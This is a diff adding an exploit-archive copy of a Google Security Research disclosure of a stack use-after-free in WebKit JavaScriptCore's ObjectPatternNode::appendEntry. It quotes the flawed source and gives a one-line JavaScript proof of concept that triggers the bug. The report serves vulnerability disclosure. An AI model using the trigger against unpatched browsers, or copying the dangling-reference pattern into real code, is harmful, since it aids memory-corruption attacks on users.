@@ -1,0 +1,41 @@
+id: 28182
+date: 07/25/2017
+title: WebKit JSC ObjectPatternNode::appendEntry Use-After-Free Vulnerability
+author: Google Security Research
+cves: 
+
+WebKit: JSC: Stack-Use-After-Free in ObjectPatternNode::appendEntry 
+
+
+
+
+Here's a snippet of ObjectPatternNode::appendEntry.
+
+void appendEntry(const JSTokenLocation&, ExpressionNode* propertyExpression, DestructuringPatternNode* pattern, ExpressionNode* defaultValue, BindingType bindingType)
+{
+    m_targetPatterns.append(Entry{ Identifier(), propertyExpression, false, pattern, defaultValue, bindingType });
+}
+
+Here's the definition of Entry.
+
+struct Entry {
+    const Identifier& propertyName;
+    ExpressionNode* propertyExpression;
+    bool wasString;
+    DestructuringPatternNode* pattern;
+    ExpressionNode* defaultValue;
+    BindingType bindingType;
+};
+
+The Identifier object created by "Identifier()" is in the stack. So it will get freed in the end of the appendEntry method.
+
+PoC:
+var {[a]: b, ...[]} = {};
+
+
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available, the bug report will become
+visible to the public.
+
+#  0day.today [2023-03-24]  #
